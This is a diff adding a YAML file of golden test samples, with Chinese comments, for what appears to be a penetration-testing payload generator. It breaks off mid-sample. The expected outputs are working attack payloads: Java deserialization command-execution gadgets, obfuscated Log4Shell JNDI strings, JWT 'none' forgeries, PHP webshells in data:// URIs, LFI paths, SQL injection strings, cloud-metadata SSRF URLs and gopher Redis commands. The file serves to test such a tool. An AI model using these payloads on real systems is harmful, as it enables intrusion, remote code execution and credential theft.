@@ -1,0 +1,2095 @@
+# 字典槽位的**逐选项**黄金样本。
+#
+# 为什么单开一份：字符串槽位的选项是 `'` / `1` / `2` 这种短字面量，写错了肉眼能看出来；
+# 字典槽位的每个选项却带一组字段（`{id: sh, shell: "/bin/sh", flag: "-c"}`），
+# 打错一个字符（`-c` 写成 `-C`、`cmd.exe` 写成 `cmd.ex`、`utf-32` 写成 `utf32`）
+# 产出的就是一条**语法合法、语义已错**的载荷，而没有任何测试会红。
+#
+# 已有的样本只走默认取值，非默认选项从没被真的渲染过。这里给每个字典槽位的
+# **每一个选项**各写一条，state 里显式指定该选项，其余取默认。
+#
+# 期望值全部照着 data/ 里的 body 手推：槽位填充（`<<名.字段>>` → 字段值）
+# → 变量替换（`<<变量>>` / `<<rep>>` / `<<select>>`）→ 输出渲染。
+# 不透明的字面量（JWT 头段的 base64url、data:// 的 b64 代码）**独立解码核对过**，
+# 不是从工具输出粘的。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= deser.java.xmldecoder.process · sh =================
+  # 槽位 sh 是一组「解释器 + 参数标志」的配套字段：`/bin/sh` 必须配 `-c`，
+  # `cmd.exe` 必须配 `/c`。拆成两个独立槽位就能拼出 `cmd.exe -c`。
+
+  - name: deser.java.xmldecoder.process · sh=sh
+    state:
+      vuln: deser
+      component: java
+      template: deser.java.xmldecoder.process
+      slots: {sh: sh}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+           <void index="0"><string>/bin/sh</string></void>
+           <void index="1"><string>-c</string></void>
+           <void index="2"><string>id</string></void>
+          </array>
+          <void method="start"/>
+         </object>
+        </java>
+      syntax: ok
+
+  - name: deser.java.xmldecoder.process · sh=cmd
+    state:
+      vuln: deser
+      component: java
+      template: deser.java.xmldecoder.process
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      # 换到 Windows 档：shell/flag 两个字段必须一起变，`cmd.exe -c` 是坏载荷
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <object class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+           <void index="0"><string>cmd.exe</string></void>
+           <void index="1"><string>/c</string></void>
+           <void index="2"><string>whoami</string></void>
+          </array>
+          <void method="start"/>
+         </object>
+        </java>
+      syntax: ok
+
+  # ================= deser.java.xmldecoder.runtime · sh =================
+
+  - name: deser.java.xmldecoder.runtime · sh=sh
+    state:
+      vuln: deser
+      component: java
+      template: deser.java.xmldecoder.runtime
+      slots: {sh: sh}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <void class="java.lang.Runtime" method="getRuntime">
+          <object method="exec">
+           <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/sh</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>id</string></void>
+           </array>
+          </object>
+         </void>
+        </java>
+      syntax: ok
+
+  - name: deser.java.xmldecoder.runtime · sh=cmd
+    state:
+      vuln: deser
+      component: java
+      template: deser.java.xmldecoder.runtime
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+         <void class="java.lang.Runtime" method="getRuntime">
+          <object method="exec">
+           <array class="java.lang.String" length="3">
+            <void index="0"><string>cmd.exe</string></void>
+            <void index="1"><string>/c</string></void>
+            <void index="2"><string>whoami</string></void>
+           </array>
+          </object>
+         </void>
+        </java>
+      syntax: ok
+
+  # ================= deser.java.xstream.dynamicproxy · sh =================
+
+  - name: deser.java.xstream.dynamicproxy · sh=sh
+    state:
+      vuln: deser
+      component: xstream
+      template: deser.java.xstream.dynamicproxy
+      slots: {sh: sh}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <sorted-set>
+          <string>foo</string>
+          <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+              <target class="java.lang.ProcessBuilder">
+                <command>
+                  <string>/bin/sh</string>
+                  <string>-c</string>
+                  <string>id</string>
+                </command>
+              </target>
+              <action>start</action>
+            </handler>
+          </dynamic-proxy>
+        </sorted-set>
+      syntax: ok
+
+  - name: deser.java.xstream.dynamicproxy · sh=cmd
+    state:
+      vuln: deser
+      component: xstream
+      template: deser.java.xstream.dynamicproxy
+      slots: {sh: cmd}
+      vars: {cmd: whoami}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <sorted-set>
+          <string>foo</string>
+          <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+              <target class="java.lang.ProcessBuilder">
+                <command>
+                  <string>cmd.exe</string>
+                  <string>/c</string>
+                  <string>whoami</string>
+                </command>
+              </target>
+              <action>start</action>
+            </handler>
+          </dynamic-proxy>
+        </sorted-set>
+      syntax: ok
+
+  # ================= deser.java.log4j.obfuscate · style =================
+  # 三个选项是三种「把 jndi:ldap 拆散」的手法，产出的前缀完全不同。
+  # `name` 是模板声明的变量、不是槽位，漏填会留下字面量 `<<name>>`。
+
+  - name: deser.java.log4j.obfuscate · style=lower
+    state:
+      vuln: deser
+      component: log4j
+      template: deser.java.log4j.obfuscate
+      slots: {style: lower}
+      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
+      outputs: [raw]
+    expect:
+      payload: "${lower:j}ndi:${lower:l}dap://10.0.0.1:1389/Exploit"
+
+  - name: deser.java.log4j.obfuscate · style=upper
+    state:
+      vuln: deser
+      component: log4j
+      template: deser.java.log4j.obfuscate
+      slots: {style: upper}
+      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
+      outputs: [raw]
+    expect:
+      payload: "${upper:J}NDI:${upper:L}DAP://10.0.0.1:1389/Exploit"
+
+  - name: deser.java.log4j.obfuscate · style=dash
+    state:
+      vuln: deser
+      component: log4j
+      template: deser.java.log4j.obfuscate
+      slots: {style: dash}
+      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
+      outputs: [raw]
+    expect:
+      # `${::-j}` 是「取默认值空串」的写法，等价于字面 j；整串里没有 jndi/ldap 明文
+      payload: "${${::-j}${::-n}${::-d}${::-i}:${${::-l}${::-d}${::-a}${::-p}}://10.0.0.1:1389/Exploit"
+
+  # ================= deser.php.syntax.boolean · v =================
+  # 序列化里的布尔/空值只有三种形态，字段名就叫 seq。
+
+  - name: deser.php.syntax.boolean · v=true_
+    state:
+      vuln: deser
+      component: php
+      template: deser.php.syntax.boolean
+      slots: {v: true_}
+      outputs: [raw]
+    expect:
+      payload: "b:1;"
+
+  - name: deser.php.syntax.boolean · v=false_
+    state:
+      vuln: deser
+      component: php
+      template: deser.php.syntax.boolean
+      slots: {v: false_}
+      outputs: [raw]
+    expect:
+      payload: "b:0;"
+
+  - name: deser.php.syntax.boolean · v=null_
+    state:
+      vuln: deser
+      component: php
+      template: deser.php.syntax.boolean
+      slots: {v: null_}
+      outputs: [raw]
+    expect:
+      # 空值不是 `b:0;` 也不是 `s:0:"";`，是单独的 `N;`——这里打错是最典型的静默损坏
+      payload: "N;"
+
+  # ================= jwt.generic.none.header · alg =================
+  # 头部 JSON 里 alg 的大小写四档，用来打「正则只匹配小写 none」的库。
+  # 期望值里的 JSON 逐字符写出来，字段顺序保持 body 里的 alg → typ。
+
+  - name: jwt.generic.none.header · alg=none
+    state:
+      vuln: jwt
+      template: jwt.generic.none.header
+      slots: {alg: none}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"none","typ":"JWT"}'
+      syntax: ok
+
+  - name: jwt.generic.none.header · alg=none-cap
+    state:
+      vuln: jwt
+      template: jwt.generic.none.header
+      slots: {alg: none-cap}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"None","typ":"JWT"}'
+      syntax: ok
+
+  - name: jwt.generic.none.header · alg=none-upper
+    state:
+      vuln: jwt
+      template: jwt.generic.none.header
+      slots: {alg: none-upper}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"NONE","typ":"JWT"}'
+      syntax: ok
+
+  - name: jwt.generic.none.header · alg=none-mixed
+    state:
+      vuln: jwt
+      template: jwt.generic.none.header
+      slots: {alg: none-mixed}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"nOnE","typ":"JWT"}'
+      syntax: ok
+
+  # ================= jwt.generic.none.token · alg =================
+  # 头段是**槽位里预先算好的 base64url**，不是运行时编码的——所以这里要钉住
+  # 「哪个选项对应哪一段 base64」。四段都独立 base64 解码核对过：
+  #   none      → {"alg":"none","typ":"JWT"}
+  #   none-cap  → {"alg":"None","typ":"JWT"}
+  #   none-upper→ {"alg":"NONE","typ":"JWT"}
+  #   none-mixed→ {"alg":"nOnE","typ":"JWT"}
+  # claims 段是 {"sub":"admin"} 的 base64url（无填充）。
+
+  - name: jwt.generic.none.token · alg=none
+    state:
+      vuln: jwt
+      template: jwt.generic.none.token
+      slots: {alg: none}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      # 签名段留空但点号保留 —— 两段 + 尾点
+      payload: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+
+  - name: jwt.generic.none.token · alg=none-cap
+    state:
+      vuln: jwt
+      template: jwt.generic.none.token
+      slots: {alg: none-cap}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+
+  - name: jwt.generic.none.token · alg=none-upper
+    state:
+      vuln: jwt
+      template: jwt.generic.none.token
+      slots: {alg: none-upper}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+
+  - name: jwt.generic.none.token · alg=none-mixed
+    state:
+      vuln: jwt
+      template: jwt.generic.none.token
+      slots: {alg: none-mixed}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+
+  # ================= jwt.generic.none.two_segment · alg =================
+  # 同一组头段，但**没有尾点**——有些实现只认两段结构。
+
+  - name: jwt.generic.none.two_segment · alg=none
+    state:
+      vuln: jwt
+      template: jwt.generic.none.two_segment
+      slots: {alg: none}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9
+
+  - name: jwt.generic.none.two_segment · alg=none-cap
+    state:
+      vuln: jwt
+      template: jwt.generic.none.two_segment
+      slots: {alg: none-cap}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9
+
+  - name: jwt.generic.none.two_segment · alg=none-upper
+    state:
+      vuln: jwt
+      template: jwt.generic.none.two_segment
+      slots: {alg: none-upper}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9
+
+  - name: jwt.generic.none.two_segment · alg=none-mixed
+    state:
+      vuln: jwt
+      template: jwt.generic.none.two_segment
+      slots: {alg: none-mixed}
+      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
+      outputs: [raw]
+    expect:
+      payload: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9
+
+  # ================= jwt.generic.jwk.header · jwk =================
+  # 这两个选项的字段值是**一整段嵌了变量的 JSON**（`"kid":"<<kid>>"`），
+  # 所以它同时钉住两件事：字段值原样代入 jwk.key、内层 `<<kid>>` 在下一阶段才求值。
+
+  - name: jwt.generic.jwk.header · jwk=rsa
+    state:
+      vuln: jwt
+      template: jwt.generic.jwk.header
+      slots: {jwk: rsa}
+      vars:
+        kid: attacker
+        modulus: sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789
+        secret: supersecret
+      outputs: [raw]
+    expect:
+      # alg 走槽位字段 RS256；内层 kid/n 与外层 kid 同值（都来自 <<kid>>）
+      payload: '{"alg":"RS256","typ":"JWT","kid":"attacker","jwk":{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":"sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789","e":"AQAB"}}'
+      syntax: ok
+
+  - name: jwt.generic.jwk.header · jwk=oct
+    state:
+      vuln: jwt
+      template: jwt.generic.jwk.header
+      slots: {jwk: oct}
+      vars:
+        kid: attacker
+        modulus: sXchG1aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789
+        secret: supersecret
+      outputs: [raw]
+    expect:
+      # 对称密钥档：alg 变 HS256，密钥体只有 k，且**不带** n/e
+      payload: '{"alg":"HS256","typ":"JWT","kid":"attacker","jwk":{"kty":"oct","alg":"HS256","k":"supersecret"}}'
+      syntax: ok
+
+  # ================= lfi.generic.filter.iconv · enc =================
+
+  - name: lfi.generic.filter.iconv · enc=utf16
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.filter.iconv
+      slots: {enc: utf16}
+      vars: {file: /var/www/html/config.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.iconv.utf-8.utf-16/resource=/var/www/html/config.php"
+
+  - name: lfi.generic.filter.iconv · enc=utf7
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.filter.iconv
+      slots: {enc: utf7}
+      vars: {file: /var/www/html/config.php}
+      outputs: [raw]
+    expect:
+      payload: "php://filter/convert.iconv.utf-8.utf-7/resource=/var/www/html/config.php"
+
+  - name: lfi.generic.filter.iconv · enc=utf32
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.filter.iconv
+      slots: {enc: utf32}
+      vars: {file: /var/www/html/config.php}
+      outputs: [raw]
+    expect:
+      # 链名是 utf-8.utf-32（带横杠）；少一个横杠 PHP 会直接说 filter 不存在
+      payload: "php://filter/convert.iconv.utf-8.utf-32/resource=/var/www/html/config.php"
+
+  # ================= lfi.generic.data.base64 · code =================
+  # 三个字段是**手算好的** base64，独立解码核对过：
+  #   sys_get   → <?php system($_GET['c']); ?>   （键带引号，见模板里的注释）
+  #   eval_post → <?php @eval($_POST[1]);?>
+  #   phpinfo   → <?php phpinfo(); ?>
+
+  - name: lfi.generic.data.base64 · code=sys_get
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.data.base64
+      slots: {code: sys_get}
+      outputs: [raw]
+    expect:
+      payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
+
+  - name: lfi.generic.data.base64 · code=eval_post
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.data.base64
+      slots: {code: eval_post}
+      outputs: [raw]
+    expect:
+      # 这条的 base64 末尾是 `Pg==`（解码成 `?>`），和 phpinfo 那条的 `Pg==` 不是同一串
+      payload: "data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="
+
+  - name: lfi.generic.data.base64 · code=phpinfo
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.data.base64
+      slots: {code: phpinfo}
+      outputs: [raw]
+    expect:
+      payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+
+  # ================= lfi.generic.log.apache · log =================
+  # 三个选项是三种发行版的默认日志路径，路径里 `access.log` 与 `access_log` 不能混。
+
+  - name: lfi.generic.log.apache · log=debian
+    state:
+      vuln: lfi
+      template: lfi.generic.log.apache
+      slots: {log: debian}
+      outputs: [raw]
+    expect:
+      payload: "/var/log/apache2/access.log"
+
+  - name: lfi.generic.log.apache · log=rhel
+    state:
+      vuln: lfi
+      template: lfi.generic.log.apache
+      slots: {log: rhel}
+      outputs: [raw]
+    expect:
+      # RHEL 系是 httpd 目录 + **下划线** access_log
+      payload: "/var/log/httpd/access_log"
+
+  - name: lfi.generic.log.apache · log=custom
+    state:
+      vuln: lfi
+      template: lfi.generic.log.apache
+      slots: {log: custom}
+      outputs: [raw]
+    expect:
+      payload: "/usr/local/apache/logs/access_log"
+
+  # ================= lfi.generic.log.nginx · log =================
+
+  - name: lfi.generic.log.nginx · log=access
+    state:
+      vuln: lfi
+      template: lfi.generic.log.nginx
+      slots: {log: access}
+      outputs: [raw]
+    expect:
+      payload: "/var/log/nginx/access.log"
+
+  - name: lfi.generic.log.nginx · log=error
+    state:
+      vuln: lfi
+      template: lfi.generic.log.nginx
+      slots: {log: error}
+      outputs: [raw]
+    expect:
+      # error.log 只有 `nginx` 目录下那一份，没有 apache2 那种分裂
+      payload: "/var/log/nginx/error.log"
+
+  # ================= lfi.generic.log.ssh · log =================
+
+  - name: lfi.generic.log.ssh · log=debian
+    state:
+      vuln: lfi
+      template: lfi.generic.log.ssh
+      slots: {log: debian}
+      outputs: [raw]
+    expect:
+      payload: "/var/log/auth.log"
+
+  - name: lfi.generic.log.ssh · log=rhel
+    state:
+      vuln: lfi
+      template: lfi.generic.log.ssh
+      slots: {log: rhel}
+      outputs: [raw]
+    expect:
+      # RHEL 系的认证日志叫 secure，不叫 auth.log——选错就是读不到
+      payload: "/var/log/secure"
+
+  # ================= lfi.generic.session · sess =================
+  # 四个选项是 session 文件目录 + **带 sess_ 前缀**的配套字段。
+  # 前缀写在槽位里、sid 是变量：这两截拼起来才是完整路径，少一截都读不到。
+
+  - name: lfi.generic.session · sess=debian
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.session
+      slots: {sess: debian}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "/var/lib/php/sessions/sess_abc123"
+
+  - name: lfi.generic.session · sess=tmp
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.session
+      slots: {sess: tmp}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      payload: "/tmp/sess_abc123"
+
+  - name: lfi.generic.session · sess=rhel
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.session
+      slots: {sess: rhel}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      # RHEL 系是单数 session（不是 sessions）
+      payload: "/var/lib/php/session/sess_abc123"
+
+  - name: lfi.generic.session · sess=windows
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.session
+      slots: {sess: windows}
+      vars: {sid: abc123}
+      outputs: [raw]
+    expect:
+      # 反斜杠是路径分隔符，不是转义——单引号标量保证它原样进载荷
+      payload: 'C:\Windows\Temp\sess_abc123'
+
+  # ================= lfi.generic.nullbyte · w =================
+  # 两个选项是「前缀有无」：带 php://filter 读源码，不带则直接包含本地文件。
+
+  - name: lfi.generic.nullbyte · w=filter_base64
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.nullbyte
+      slots: {w: filter_base64}
+      vars: {file: /etc/passwd}
+      outputs: [raw]
+    expect:
+      # %00 是 body 自带的，不属于槽位——槽位只管前缀
+      payload: "php://filter/convert.base64-encode/resource=/etc/passwd%00"
+
+  - name: lfi.generic.nullbyte · w=plain
+    state:
+      vuln: lfi
+      component: php
+      template: lfi.generic.nullbyte
+      slots: {w: plain}
+      vars: {file: /etc/passwd}
+      outputs: [raw]
+    expect:
+      # plain 档的 prefix 是空串，载荷以路径本身开头，%00 紧跟其后
+      payload: "/etc/passwd%00"
+
+  # ================= sqli.mssql.union.databases · src =================
+  # 三个选项是「表名 + 列名」的配套组，`<<select(cols,pos,src.col)>>` 会同时用到两截。
+  # 其余槽位取默认：close=' cols=3 pos=1 comment=--
+  # pos=1 意味着表达式落在第 1 个回显位。
+
+  - name: sqli.mssql.union.databases · src=sysdb
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.databases
+      slots: {src: sysdb}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT name,2,3 FROM sys.databases --"
+
+  - name: sqli.mssql.union.databases · src=sysdb_agg
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.databases
+      slots: {src: sysdb_agg}
+      outputs: [raw]
+    expect:
+      # col 字段值自带逗号（string_agg(name,',')），<<select>> 只按**前两个**逗号切参数，
+      # 所以表达式里的逗号不会被当成分隔符——这里正是钉住这条
+      payload: "' UNION SELECT string_agg(name,','),2,3 FROM sys.databases --"
+
+  - name: sqli.mssql.union.databases · src=schema
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.databases
+      slots: {src: schema}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT schema_name,2,3 FROM information_schema.schemata --"
+
+  # ================= sqli.mysql.union.tables · where =================
+  # 子句槽位：选 any 时子句是空串，tables 后面紧跟一个空格再跟注释。
+
+  - name: sqli.mysql.union.tables · where=current
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: current}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database() -- -"
+
+  - name: sqli.mysql.union.tables · where=named
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: named}
+      vars: {db: security}
+      outputs: [raw]
+    expect:
+      # 子句值里嵌的 <<db>> 到变量阶段才求值——槽位先填、变量后替换
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema='security' -- -"
+
+  - name: sqli.mysql.union.tables · where=mysql
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: mysql}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema='mysql' -- -"
+
+  - name: sqli.mysql.union.tables · where=any
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.tables
+      slots: {where: any}
+      outputs: [raw]
+    expect:
+      # 子句是空串，所以 tables 后面不会留下多余空白（空格在 body 里、注释前那一个）
+      payload: "' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables -- -"
+
+  # ================= sqli.mysql.error.nocolumn · t =================
+  # seed 是「目标表有几列」的占位 SELECT，列数必须与真实表一致，否则 UNION 报的是
+  # 列数不符、而不是我们要的 extractvalue 报错。
+  # 其余槽位取默认：colidx=2 close=' comment=-- -
+
+  - name: sqli.mysql.error.nocolumn · t=n2
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n2}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  - name: sqli.mysql.error.nocolumn · t=n3
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n3}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2,3 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  - name: sqli.mysql.error.nocolumn · t=n4
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n4}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2,3,4 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  - name: sqli.mysql.error.nocolumn · t=n5
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n5}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2,3,4,5 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  - name: sqli.mysql.error.nocolumn · t=n10
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n10}
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2,3,4,5,6,7,8,9,10 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  # ================= ssrf.generic.cloud.metadata · target =================
+  # 12 个云厂商的元数据地址。这些**不能靠记忆写**——地址写错一条就是一条
+  # 打不通但看着很正常的载荷，所以逐个钉住。
+  # 括号里写「要带某某头」的，载荷本身带不了那个头，靠 desc/name 提醒。
+
+  - name: ssrf.generic.cloud.metadata · target=aws
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: aws}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/latest/meta-data/"
+
+  - name: ssrf.generic.cloud.metadata · target=aws_iam
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: aws_iam}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+  - name: ssrf.generic.cloud.metadata · target=aws_ecs
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: aws_ecs}
+      outputs: [raw]
+    expect:
+      # ECS 任务元数据在 169.254.170.2，不是通用的 .169.254
+      payload: "http://169.254.170.2/v2/metadata"
+
+  - name: ssrf.generic.cloud.metadata · target=gcp
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: gcp}
+      outputs: [raw]
+    expect:
+      # 走域名而不是链路本地 IP——所以 GCP 这条在只允许 IP 的 SSRF 里出不来
+      payload: "http://metadata.google.internal/computeMetadata/v1/"
+
+  - name: ssrf.generic.cloud.metadata · target=azure
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: azure}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+  - name: ssrf.generic.cloud.metadata · target=azure_msi
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: azure_msi}
+      outputs: [raw]
+    expect:
+      # resource 参数是第二个查询参数，`&` 必须原样在载荷里（query 提交时才会被编码）
+      payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+  - name: ssrf.generic.cloud.metadata · target=oracle
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: oracle}
+      outputs: [raw]
+    expect:
+      # Oracle 走 /opc/v2/ 而不是 /latest/，路径里还带一个实例段
+      payload: "http://169.254.169.254/opc/v2/instance/"
+
+  - name: ssrf.generic.cloud.metadata · target=aliyun
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: aliyun}
+      outputs: [raw]
+    expect:
+      # 阿里云不在 169.254 网段，是 100.100.100.200
+      payload: "http://100.100.100.200/latest/meta-data/"
+
+  - name: ssrf.generic.cloud.metadata · target=tencent
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: tencent}
+      outputs: [raw]
+    expect:
+      payload: "http://metadata.tencentyun.com/latest/meta-data/"
+
+  - name: ssrf.generic.cloud.metadata · target=huawei
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: huawei}
+      outputs: [raw]
+    expect:
+      # 华为云是 OpenStack 血统：路径是 openstack/latest/meta_data.json（下划线）
+      payload: "http://169.254.169.254/openstack/latest/meta_data.json"
+
+  - name: ssrf.generic.cloud.metadata · target=volc
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: volc}
+      outputs: [raw]
+    expect:
+      # 火山引擎是 100.96.0.96，和阿里云的 100.100.100.200 差一位都不能混
+      payload: "http://100.96.0.96/latest/meta-data/"
+
+  - name: ssrf.generic.cloud.metadata · target=digitalocean
+    state:
+      vuln: ssrf
+      template: ssrf.generic.cloud.metadata
+      slots: {target: digitalocean}
+      outputs: [raw]
+    expect:
+      payload: "http://169.254.169.254/metadata/v1/"
+
+  # ================= ssrf.generic.scheme.gopher.redis · cmd =================
+  # Redis 的写文件三步要按顺序来：dir → dbfilename → save。
+  # 槽位只提供**单条命令**，顺序由用户自己串，所以这里钉的是每条命令的原始字节。
+  # port 取默认 6379。
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=flushall
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: flushall}
+      outputs: [raw]
+    expect:
+      # %0D%0A 是 body 自带的收尾，gopher 靠它把命令切出来
+      payload: "gopher://127.0.0.1:6379/_flushall%0D%0A"
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=info
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: info}
+      outputs: [raw]
+    expect:
+      payload: "gopher://127.0.0.1:6379/_info%0D%0A"
+
+  - name: ssrf.generic.scheme.gopher.redis · cmd=dir_cron
+    state:
+      vuln: ssrf
+      template: ssrf.generic.scheme.gopher.redis
+      slots: {cmd: dir_cron}
+      outputs: [raw]
+    expect:
+      # 空格已经手工编码成 %20，槽位里不能再出现裸空格
